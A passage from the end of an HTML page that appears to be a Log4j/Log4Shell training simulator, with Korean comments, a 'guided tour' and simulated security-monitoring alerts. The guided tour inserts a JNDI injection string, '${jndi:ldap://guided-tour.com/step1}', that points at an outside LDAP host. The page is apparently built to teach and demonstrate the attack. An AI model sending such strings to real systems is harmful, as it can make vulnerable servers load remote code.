        // 가이드 투어 시작
        alert('가이드 투어를 시작합니다. 첫 번째 공격 패턴을 테스트해보세요!');
        insertAttackPattern('${jndi:ldap://guided-tour.com/step1}');
      }

      // 실시간 보안 모니터링 시뮬레이션
      setInterval(function () {
        if (Math.random() < 0.1) {
          // 10% 확률로 보안 이벤트 시뮬레이션
          const events = [
            'Suspicious search pattern detected',
            'Multiple JNDI attempts from same IP',
            'Potential vulnerability scan detected',
            'Log4j pattern analysis completed',
          ];
          const randomEvent = events[Math.floor(Math.random() * events.length)];
          addLogEntry(`[보안] ${randomEvent}`, 'warning');
        }
      }, 15000); // 15초마다 체크
    </script>
  </body>
</html>
